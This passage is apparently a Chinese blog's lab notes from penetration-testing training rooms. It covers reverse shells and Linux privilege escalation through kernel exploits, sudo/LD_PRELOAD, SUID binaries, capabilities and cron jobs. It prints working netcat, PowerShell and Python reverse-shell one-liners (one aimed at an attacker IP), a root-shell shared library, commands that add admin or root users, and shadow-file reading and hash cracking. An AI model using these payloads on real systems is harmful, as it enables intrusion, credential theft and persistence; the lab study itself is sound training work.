<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917172841950.png"></p>
<p>可以使用非常相似的命令发送 netcat 反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/f; nc &lt;LOCAL-IP&gt; &lt;PORT&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</span><br></pre></td></tr></table></figure>

<p>除了使用 netcat connect 语法（而不是 netcat Listen 语法）之外，此命令实际上与前一个命令相同。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917172945229.png"></p>
<p>当针对现代 Windows Server 时，需要 Powershell 反向 shell 是很常见的，因此我们将在这里介绍标准的单行 PSH 反向 shell。</p>
<p>该命令非常复杂，为了简单起见，这里不再直接解释。然而，这是一本非常有用的单行文字，值得随身携带：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#x27;**&lt;ip&gt;**&#x27;,**&lt;port&gt;**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i =  $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object  -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#x27;PS &#x27; +  (pwd).Path + &#x27;&gt; &#x27;;$sendbyte =  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure>

<p>为了使用它，我们需要用适当的 IP 和端口选择替换“<IP>”和“<port>”。然后可以将其复制到 cmd.exe shell（或在  Windows 服务器上执行命令的另一种方法，例如 webshell）中并执行，从而生成反向 shell</port></IP></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917173238329.png"></p>
<h4 id="Task7-拿到shell下一步"><a href="#Task7-拿到shell下一步" class="headerlink" title="Task7 拿到shell下一步"></a>Task7 拿到shell下一步</h4><p>我们已经介绍了许多生成、发送和接收 shell 的方法。这些的共同点是它们往往不稳定且非交互式。即使是更容易稳定的 Unix 风格的 shell 也不是理想的。那么，对此我们能做些什么呢？</p>
<p>理想情况下，在Linux上，我们会寻找机会访问用户帐户。存储在<code>/home/&lt;user&gt;/.ssh</code>中的SSH密钥通常是实现此目的的理想方法。在 CTF 中，在盒子上的某个地方发现凭证的情况也并不少见。有些漏洞还允许您添加自己的帐户。特别是像<a target="_blank" rel="noopener" href="https://dirtycow.ninja/">Dirty C0w</a>或可写的 &#x2F;etc&#x2F;shadow 或 &#x2F;etc&#x2F;passwd 这样的东西会很快让你通过SSH访问机器，假设SSH是开放的。</p>
<p>在 Windows 上选项通常更加有限。有时可以在注册表中找到正在运行的服务的密码。例如，VNC 服务器经常将密码以明文形式存储在注册表中。某些版本的 FileZilla FTP 服务器还会将凭据保留在XML文件中： <code>C:\Program Files\FileZilla Server\FileZilla Server.xml</code> 或者 <code>C:\xampp\FileZilla Server\FileZilla Server.xml</code> 。这些可以是MD5哈希值或纯文本形式，具体取决于版本。</p>
<p>理想情况下，在 Windows 上，您将获得以 SYSTEM 用户身份运行的 shell，或者以高权限运行的管理员帐户。在这种情况下，可以简单地将您自己的帐户（在管理员组中）添加到计算机，然后通过RDP 、 telnet 、 winexe 、 psexec 、 WinRM 或任意数量的其他方法登录，具体取决于机器上运行的服务。</p>
<p>其语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user &lt;username&gt; &lt;password&gt; /add</span><br><span class="line">net localgroup administrators &lt;username&gt; /add</span><br></pre></td></tr></table></figure>

<h3 id="Linux-权限提升"><a href="#Linux-权限提升" class="headerlink" title="Linux 权限提升"></a>Linux 权限提升</h3><h4 id="Task1-信息搜集"><a href="#Task1-信息搜集" class="headerlink" title="Task1 信息搜集"></a>Task1 信息搜集</h4><h5 id="hostname"><a href="#hostname" class="headerlink" title="hostname"></a>hostname</h5><p><code>hostname</code>命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息（例如用于生产SQL服务器的SQL -PROD-01） 。</p>
<h5 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a>uname -a</h5><p>将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限升级的潜在内核漏洞时非常有用。</p>
<h5 id="proc-version"><a href="#proc-version" class="headerlink" title="&#x2F;proc&#x2F;version"></a>&#x2F;proc&#x2F;version</h5><p>proc 文件系统 (procfs) 提供有关目标系统进程的信息。您会在许多不同的Linux版本中找到 proc，这使其成为您的武器库中必不可少的工具。</p>
<p>Looking at <code>/proc/version</code>看着 <code>/proc/version</code> 可能会为您提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）。</p>
<h5 id="etc-issue"><a href="#etc-issue" class="headerlink" title="&#x2F;etc&#x2F;issue"></a>&#x2F;etc&#x2F;issue</h5><p>还可以通过查看<code>/etc/issue</code>文件来识别系统。该文件通常包含一些有关操作系统的信息，但可以轻松自定义或更改。在这个主题上，任何包含系统信息的文件都可以定制或更改。为了更清楚地了解系统，最好查看所有这些内容。</p>
<h5 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h5><p><code>ps</code>命令是查看Linux系统上正在运行的进程的有效方法。在终端上输入<code>ps</code>将显示当前 shell 的进程。</p>
<p><code>ps</code> （进程状态）的输出将显示以下内容；</p>
<ul>
<li>PID ：进程ID（进程唯一）</li>
<li>TTY：用户使用的终端类型</li>
<li>时间：进程使用的CPU时间量（这不是该进程运行的时间）</li>
<li>CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）</li>
</ul>
<p>“ps”命令提供了一些有用的选项。</p>
<ul>
<li><p><code>ps -A</code> ：查看所有正在运行的进程</p>
</li>
<li><p><code>ps axjf</code> ：查看进程树（在下面运行<code>ps axjf</code>之前查看树的形成）</p>
</li>
<li><p><code>ps aux</code> ： <code>aux</code>选项将显示所有用户的进程 (a)、显示启动进程的用户 (u) 以及显示未连接到终端的进程 (x)。查看ps aux命令的输出，我们可以更好地了解系统和潜在的漏洞。</p>
</li>
</ul>
<h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><p><code>env</code>命令将显示环境变量。</p>
<p>PATH 变量可能具有编译器或脚本语言（例如Python），可用于在目标系统上运行代码或用于权限升级。</p>
<h5 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="&#x2F;etc&#x2F;passwd"></a>&#x2F;etc&#x2F;passwd</h5><p>读取<code>/etc/passwd</code>文件是发现系统上用户的简单方法。虽然输出可能很长并且有点令人生畏，但它可以轻松地被剪切并转换为用于暴力攻击的有用列表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | cut -d &quot;:&quot; -f 1</span><br></pre></td></tr></table></figure>

<p>请记住，这将返回所有用户，其中一些是不是很有用的系统或服务用户。另一种方法可能是 grep 查找“home”，因为真正的用户很可能将其文件夹放在“home”目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | grep home</span><br></pre></td></tr></table></figure>

<h5 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h5><p>目标系统可能是另一个网络的枢纽点。 <code>ifconfig</code>命令将为我们提供有关系统网络接口的信息。下面的示例显示目标系统具有三个接口（eth0、tun0 和 tun1）。我们的攻击机器可以到达 eth0 接口，但无法直接访问其他两个网络。</p>
<p>可以使用<code>ip route</code>命令查看存在哪些网络路由来确认这一点</p>
<h5 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h5><p>在对现有接口和网络路由进行初步检查后，值得研究现有通信。 <code>netstat</code>命令可以与多个不同的选项一起使用来收集有关现有连接的信息。</p>
<ul>
<li><code>netstat -a</code> ：显示所有监听端口和已建立的连接。</li>
<li><code>netstat -at</code>或<code>netstat -au</code>还可用于分别列出 TCP 或UDP协议。</li>
<li><code>netstat -l</code> ：列出“监听”模式下的端口。这些端口已打开并准备好接受传入连接。这可以与“t”选项一起使用，以仅列出使用TCP协议侦听的端口（如下）</li>
<li><code>netstat -s</code> ：按协议列出网络使用统计信息（如下） 这也可以与<code>-t</code>或<code>-u</code>选项一起使用，以将输出限制为特定协议。</li>
<li><code>netstat -tp</code> ：列出连接以及服务名称和PID信息，这也可以与<code>-l</code>选项一起使用来列出侦听端口</li>
</ul>
<h5 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h5><p>在目标系统中搜索重要信息和潜在的权限升级向量可能会取得丰硕成果。内置的“查找”命令非常有用，值得保留在您的武器库中。</p>
<p>以下是“查找”命令的一些有用示例。</p>
<p> <strong>查找文件：</strong></p>
<ul>
<li><code>find . -name flag1.txt</code> ：在当前目录中查找名为“flag1.txt”的文件</li>
<li><code>find /home -name flag1.txt</code> ：在 &#x2F;home 目录中查找文件名“flag1.txt”</li>
<li><code>find / -type d -name config</code> ：查找“&#x2F;”下名为config的目录</li>
<li><code>find / -type f -perm 0777</code> ：查找具有777权限的文件（所有用户可读、可写、可执行的文件）</li>
<li><code>find / -perm a=x</code> : 查找可执行文件</li>
<li><code>find /home -user frank</code> ：查找“&#x2F;home”下用户“frank”的所有文件</li>
<li><code>find / -mtime 10</code> ：查找最近 10 天内修改过的文件</li>
<li><code>find / -atime 10</code> ：查找过去 10 天内访问过的文件</li>
<li><code>find / -cmin -60</code> ：查找过去一小时（60 分钟）内更改的文件</li>
<li><code>find / -amin -60</code> ：查找最近一小时（60 分钟）内访问的文件</li>
<li><code>find / -size 50M</code> ：查找大小为 50 MB 的文件</li>
</ul>
<p>该命令还可以与（+）和（-）符号一起使用来指定大于或小于给定大小的文件。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240917180757471.png"></p>
<p>上面的示例返回大于 100 MB 的文件。值得注意的是，“find”命令往往会产生错误，有时会导致输出难以阅读。这就是为什么明智的做法是使用带有<code>-type f 2&gt;/dev/null</code>的find命令将错误重定向到“&#x2F;dev&#x2F;null”并获得更清晰的输出</p>
<p>可以写入或执行的文件夹和文件：</p>
<ul>
<li><code>find / -writable -type d 2&gt;/dev/null</code> ：查找全局可写文件夹</li>
<li><code>find / -perm -222 -type d 2&gt;/dev/null</code> ：查找全局可写文件夹</li>
<li><code>find / -perm -o w -type d 2&gt;/dev/null</code> ：查找全局可写文件夹</li>
<li><code>find / -perm -o x -type d 2&gt;/dev/null</code> ：查找全局可执行文件夹</li>
<li>查找开发工具和支持的语言：<ul>
<li><code>find / -name perl*</code></li>
<li><code>find / -name python*</code></li>
<li><code>find / -name gcc*</code></li>
</ul>
</li>
</ul>
<p>查找特定文件权限：</p>
<p>下面是一个简短的示例，用于查找设置了 SUID 位的文件。 SUID 位允许文件以拥有该文件的帐户（而不是运行该文件的帐户）的权限级别运行。这允许一个有趣的权限升级路径，我们将在任务 6 中看到更多细节。下面的示例用于完成“find”命令的主题。</p>
<ul>
<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code> ：查找带有SUID位的文件，它允许我们以比当前用户更高的权限级别运行该文件。</li>
</ul>
<h4 id="Task2-自动化枚举工具"><a href="#Task2-自动化枚举工具" class="headerlink" title="Task2 自动化枚举工具"></a>Task2 自动化枚举工具</h4><p>有几种工具可以帮助您在枚举过程中节省时间。这些工具只能用于节省时间，因为它们可能会错过一些权限升级向量。下面是流行的Linux枚举工具的列表，以及各自的 Github 存储库的链接。</p>
<p>目标系统的环境将影响您将能够使用的工具。例如，如果目标系统上未安装用 Python 编写的工具，您将无法运行该工具。这就是为什么熟悉几个工具比拥有一个首选工具更好。</p>
<ul>
<li><strong>LinPeas</strong> ： <a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li>
<li><strong>LinEnum</strong>：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li>
<li><strong>LES（ Linux漏洞利用建议器）：</strong> <a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li>
<li><strong>Linux智能枚举：</strong> <a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li>
<li><strong>Linux隐私检查器：</strong> <a target="_blank" rel="noopener" href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li>
</ul>
<h4 id="Task3-内核漏洞"><a href="#Task3-内核漏洞" class="headerlink" title="Task3 内核漏洞"></a>Task3 内核漏洞</h4><p>理想情况下，权限升级会导致 root 权限。有时可以简单地通过利用现有漏洞来实现，或者在某些情况下通过访问具有更多权限、信息或访问权限的另一个用户帐户来实现。除非单个漏洞导致 root shell，否则权限提升过程将依赖于错误配置和宽松的权限。Linux系统上的内核管理系统内存和应用程序等组件之间的通信。这个关键功能需要内核有特定的权限；因此，成功利用该漏洞可能会导致 root 权限。</p>
<p>内核利用方法很简单；</p>
<ol>
<li>识别内核版本</li>
<li>搜索并找到目标系统内核版本的漏洞利用代码</li>
<li>运行漏洞利用程序</li>
</ol>
<p>虽然看起来很简单，但请记住，失败的内核漏洞可能会导致系统崩溃。在尝试内核漏洞之前，请确保这种潜在结果在渗透测试范围内是可以接受的。</p>
<p> <strong>研究来源：</strong></p>
<ol>
<li>根据您的发现，您可以使用 Google 搜索现有的漏洞利用代码。</li>
<li><a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/cves%E7%AD%89%E6%9D%A5%E6%BA%90%E4%B9%9F%E5%BE%88%E6%9C%89%E7%94%A8%E3%80%82">https://www.linuxkernelcves.com/cves等来源也很有用。</a></li>
<li>另一种选择是使用像 LES（ Linux Exploit Suggester）这样的脚本，但请记住，这些工具可能会生成误报（报告不影响目标系统的内核漏洞）或漏报（不报告任何内核漏洞，尽管内核是易受伤害的）。</li>
</ol>
<p> <strong>提示&#x2F;注释：</strong></p>
<ol>
<li>在 Google、Exploit-db 或 searchsploit 上搜索漏洞时对内核版本过于具体</li>
<li>在启动漏洞利用代码之前，请确保您了解其工作原理。某些漏洞利用代码可以对操作系统进行更改，从而使它们在进一步使用时不安全，或者对系统进行不可逆转的更改，从而在以后产生问题。当然，这些在实验室或 CTF 环境中可能不是大问题，但在真正的渗透测试过程中，这些绝对是禁忌。</li>
<li>某些漏洞一旦运行可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。</li>
<li>您可以分别使用<code>SimpleHTTPServer</code> Python 模块和<code>wget</code>将漏洞利用代码从您的计算机传输到目标系统。</li>
</ol>
<p>打开靶机，通过ssh进行连接，执行以下命令观察内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>得到版本如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>经过搜索存在符合版本的漏洞</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143412176.png"></p>
<p>我们通过searchsploit下载exp代码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143500996.png"></p>
<p>然后在本地编译并保存为exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exp</span><br></pre></td></tr></table></figure>

<p>本机开启http服务后，在连接的靶机的<code>/tmp</code>目录下使用wget下载下来</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143637308.png"></p>
<p>赋予777执行权限，成功提权</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928143731023.png"></p>
<h4 id="Task4-Sudo"><a href="#Task4-Sudo" class="headerlink" title="Task4 Sudo"></a>Task4 Sudo</h4><p>默认情况下，sudo 命令允许您以 root 权限运行程序。在某些情况下，系统管理员可能需要为普通用户提供一定的权限灵活性。例如，初级SOC分析师可能需要定期使用Nmap ，但不会获得完全 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行Nmap ，同时在系统的其余部分保持其常规权限级别。</p>
<p>任何用户都可以使用<code>sudo -l</code>命令检查其与 root 权限相关的当前情况。</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/%E6%98%AF%E4%B8%80%E4%B8%AA%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84%E8%B5%84%E6%BA%90%EF%BC%8C%E5%AE%83%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%89%E5%85%B3%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E6%82%A8%E5%8F%AF%E8%83%BD%E6%8B%A5%E6%9C%89">https://gtfobins.github.io/是一个有价值的资源，它提供了有关如何使用您可能拥有</a> sudo 权限的任何程序的信息。</p>
<p><strong>利用应用程序功能</strong></p>
<p>某些应用程序在此上下文中不会有已知的漏洞。您可能会看到的这样的应用程序是 Apache2 服务器。</p>
<p>在这种情况下，我们可以使用“黑客”来利用应用程序的功能来泄露信息。如下所示，Apache2 有一个选项支持加载备用配置文件（ <code>-f</code> ：指定备用 ServerConfigFile）。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928144751183.png"></p>
<p>使用此选项加载<code>/etc/shadow</code>文件将导致一条错误消息，其中包含<code>/etc/shadow</code>文件的第一行。</p>
<p><strong>利用LD_PRELOAD</strong></p>
<p>在某些系统上，您可能会看到 LD_PRELOAD 环境选项。</p>
<p>LD_PRELOAD 是一个允许任何程序使用共享库的函数。这篇<a target="_blank" rel="noopener" href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">博文</a>将让您了解 LD_PRELOAD 的功能。如果启用“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行。请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD 选项将被忽略。</p>
<p>这个特权升级向量的步骤可以总结如下：</p>
<ol>
<li>检查 LD_PRELOAD（使用 env_keep 选项）</li>
<li>编写一个简单的 C 代码编译为共享对象（.so 扩展名）文件</li>
<li>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</li>
</ol>
<p>C 代码将简单地生成一个 root shell，可以编写如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以将此代码保存为 shell.c，并使用 gcc 使用以下参数将其编译为共享对象文件；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br></pre></td></tr></table></figure>

<p>现在，当启动用户可以使用 sudo 运行的任何程序时，我们可以使用此共享对象文件。在我们的例子中，Apache2、find 或几乎任何我们可以使用 sudo 运行的程序都可以使用。</p>
<p>我们需要通过指定LD_PRELOAD选项来运行程序，如下；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</span><br></pre></td></tr></table></figure>

<p>这将导致生成具有 root 权限的 shell。</p>
<p>打开靶机，<code>sudo -l</code>发现存在find命令可以提权</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928145626013.png"></p>
<h4 id="Task5-SUID"><a href="#Task5-SUID" class="headerlink" title="Task5 SUID"></a>Task5 SUID</h4><p>许多Linux权限控制依赖于控制用户和文件交互。这是通过权限完成的。到现在为止，您知道文件可以具有读、写和执行权限。这些是在其权限级别内提供给用户的。这会随着 SUID（设备用户标识）和 SGID（设备组标识）而改变。这些允许分别以文件所有者或组所有者的权限级别执行文件。</p>
<p>您会注意到这些文件有一个“s”位设置，显示其特殊权限级别。下面命令将列出设置了 SUID 或 SGID 位的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928150146088.png"></p>
<p>可以发现nano命令已经设置为SUID位，我们可以读取<code>/etc/passwd</code>和<code>/etc/shaodw</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/passwd</span><br><span class="line">nano /etc/shaodw</span><br></pre></td></tr></table></figure>

<p>然后使用unshadow生成john可破解的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd.txt shadow.txt &gt; passwords.txt</span><br></pre></td></tr></table></figure>

<p>另一种选择是添加具有 root 权限的新用户。这将帮助我们绕过密码破解的繁琐过程。我们需要我们希望新用户拥有的密码的哈希值。这可以使用 Kali Linux上的 openssl 工具快速完成。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt rev1ve rev1ve</span><br></pre></td></tr></table></figure>

<p>然后，我们将此密码和用户名添加到<code>/etc/passwd</code>文件中，再切换用户即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rev1ve:$1$rev1ve$sQl3WXKUgGAsDB384YvPa/:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>



<p>打开靶机，查看设置了 SUID 位的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -perm -04000 -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928160212855.png"></p>
<p>注意到base64命令可以使用，参考GTFOBins</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928160252609.png"></p>
<p>执行以下命令查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/base64 /etc/shadow | base64 --decode</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928160422465.png"></p>
<p>然后使用john暴力破解得到user2的密码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240928161158193.png"></p>
<h4 id="Task6-Capabilities"><a href="#Task6-Capabilities" class="headerlink" title="Task6 Capabilities"></a>Task6 Capabilities</h4><blockquote>
<p>系统管理员可以用来提高进程或二进制文件的权限级别的另一种方法是“Capabilities”。Capabilities有助于更精细地管理权限。例如，如果SOC分析师需要使用需要启动套接字连接的工具，普通用户将无法做到这一点。如果系统管理员不想授予该用户更高的权限，他们可以更改二进制文件的功能。因此，二进制文件无需更高权限的用户即可完成其任务。功能手册页提供了有关其用法和选项的详细信息。</p>
</blockquote>
<p>我们可以使用<code>getcap</code>工具来列出启用的功能。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002103401328.png"></p>
<p>注：当以非特权用户身份运行时， <code>getcap -r /</code>将生成大量错误，因此最好将错误消息重定向到<code>/dev/null</code>。</p>
<p>通过查阅GTFObins，vim命令可以用来权限提升</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002104251996.png"></p>
<p>打开靶机后ssh连接，查找设置了capabilities可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002104547856.png"></p>
<p>利用vim命令失败，继续利用view命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view -c &#x27;:!/bin/sh&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="Task7-Cron定时任务"><a href="#Task7-Cron定时任务" class="headerlink" title="Task7 Cron定时任务"></a>Task7 Cron定时任务</h4><p>Cron 作业用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者的权限运行，而不是以当前用户的权限运行。虽然正确配置的 cron 作业本身并不容易受到攻击，但它们在某些情况下可以提供权限升级向量。这个想法很简单；如果有一个以 root 权限运行的计划任务，并且我们可以更改将运行的脚本，那么我们的脚本将以 root 权限运行。</p>
<p>Cron 作业配置存储为 crontab（cron 表），以查看任务下次运行的时间和日期。系统上的每个用户都有自己的 crontab 文件，并且无论是否登录都可以运行特定任务。正如您所期望的，我们的目标是找到由 root 设置的 cron 作业并让它运行我们的脚本（最好是 shell）。</p>
<p>任何用户都可以读取<code>/etc/crontab</code>下保存系统范围 cron 作业的文件，在渗透测试活动中，您会更经常看到每天、每周或每月运行的任务。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105602886.png"></p>
<p>您可以看到<code>backup.sh</code>脚本被配置为每分钟运行一次。该文件的内容显示了一个简单的脚本，该脚本创建prices.xls 文件的备份。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105622921.png"></p>
<p>该脚本将使用目标系统上可用的工具来启动反向 shell。<br> 需要注意的两点；</p>
<ol>
<li>命令语法将根据可用工具的不同而有所不同。 （例如<code>nc</code>可能不支持您在其他情况下可能看到的<code>-e</code>选项）</li>
<li>我们应该始终倾向于启动反向 shell，因为我们不想在真正的渗透测试过程中损害系统的完整性。</li>
</ol>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105807032.png"></p>
<p>我们开启监听器即可收到反向shell</p>
<p>Crontab 始终值得检查，因为它有时会导致轻松的权限升级向量。在不具备一定网络安全成熟度级别的公司中，以下情况并不少见：</p>
<ol>
<li>系统管理员需要定期运行脚本。</li>
<li>他们创建了一个 cron 作业来执行此操作</li>
<li>一段时间后，脚本变得毫无用处，他们将其删除</li>
<li>他们不清理相关的 cron 作业</li>
</ol>
<p>此变更管理问题会导致利用 cron 作业的潜在漏洞。</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002105930365.png"></p>
<p>上面的示例显示了类似的情况，antivirus.sh 脚本被删除，但 cron 作业仍然存在。如果未定义脚本的完整路径（就像为 backup.sh 脚本所做的那样），cron 将引用 &#x2F;etc&#x2F;crontab 文件中 PATH  变量下列出的路径。在这种情况下，我们应该能够在用户的主文件夹下创建一个名为“antivirus.sh”的脚本，并且它应该由 cron 作业运行。这样传入的反向 shell 连接具有 root 权限</p>
<p>打开靶机ssh连接，查看用户定义的cron 作业</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002110212836.png"></p>
<p>我们注意到<code>/tmp</code>路径下的test.py文件，进行搜索发现不存在</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241002110547035.png"></p>
<p>我们切换到<code>/tmp</code>目录下，创建test.py并写入反向shell（注意要赋予执行权限）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,pty,socket;s=socket.socket();s.connect((&quot;10.10.34.216&quot;,777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

